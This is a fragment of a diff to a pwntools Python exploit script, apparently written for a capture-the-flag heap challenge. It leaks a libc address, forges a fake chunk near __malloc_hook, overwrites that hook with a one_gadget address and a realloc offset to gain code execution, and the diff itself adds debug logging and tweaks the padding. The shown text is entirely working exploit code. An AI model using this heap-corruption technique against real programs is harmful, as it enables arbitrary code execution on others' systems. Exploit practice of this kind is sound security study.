@@ -40,14 +40,17 @@ p.recvuntil("3. ")
 libc_start_main = u64(p.recv(6).ljust(8 , "\x00")) - 240
 libc.address = libc_start_main - libc.sym["__libc_start_main"]
 fake_addr = libc.sym["__malloc_hook"] - 0x23
-log.info("malloc_hook : " + hex(libc.sym["__malloc_hook"]))
+
 add_e(3 , 2) # 0x60 # 2 # 4 # 5
 remove(5)
 edit(4 , "a" * 0x68 + p64(0x71) + p64(fake_addr))
 add_e(3 , 2) # 0x60 # 2 # 5 # 6
 # overwrite __malloc_hook
+log.info("malloc_hook : " + hex(libc.sym["__malloc_hook"]))
+log.info("malloc_hook : " + hex(libc.sym["__libc_realloc"]))
+debug()
 one_gadget = libc.address + 0x4526a
-edit(6 , "a" * 0x13 + p64(one_gadget) + p64(libc.sym['__libc_realloc'] + 16))
+edit(6 , "a" * 11 + p64(one_gadget) + p64(libc.sym['__libc_realloc'] + 16))
 log.info(hex(one_gadget))
 
 add_e(1,1) 
